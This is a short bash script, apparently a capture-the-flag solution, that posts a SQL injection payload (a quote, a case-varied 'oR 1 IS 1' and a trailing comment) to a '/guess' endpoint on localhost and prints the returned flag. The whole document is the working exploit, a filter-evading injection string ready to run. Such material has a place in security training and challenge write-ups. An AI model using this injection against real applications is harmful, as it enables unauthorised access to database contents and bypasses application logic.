#!/bin/bash
HOST=${HOST:-http://localhost:3000}
curl -s $HOST/guess -H 'content-type: application/json' -d '{"word": "'\'' oR 1 IS 1/*asd"}' | jq -r .flag
